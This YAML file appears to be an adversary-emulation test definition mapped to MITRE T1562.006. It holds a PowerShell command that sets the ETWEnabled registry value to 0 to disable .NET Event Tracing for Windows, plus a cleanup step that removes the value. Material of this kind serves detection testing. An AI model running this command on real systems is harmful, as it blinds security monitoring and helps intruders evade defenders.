api_version: "2.0"
name: Disable .NET Event Tracing for Windows Via Registry (powershell)
description: Disables ETW for the .NET Framework using PowerShell to update the Windows registry
uuid: 19c07a45-452d-4620-90ed-4c34fffbe758
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1562: Impair Defenses'
    subtechniques:
        - 'T1562.006: Indicator Blocking'
requirements:
    platforms:
        - os: windows
steps:
    - name: disable-.net-event-tracing-for-windows-via-registry-(powershell)
      inline: New-ItemProperty -Path HKLM:\Software\Microsoft\.NETFramework -Name ETWEnabled -Value 0 -PropertyType "DWord" -Force
      executor: powershell
      cleanup:
        inline: REG DELETE HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /f > $null 2>&1
        executor: powershell
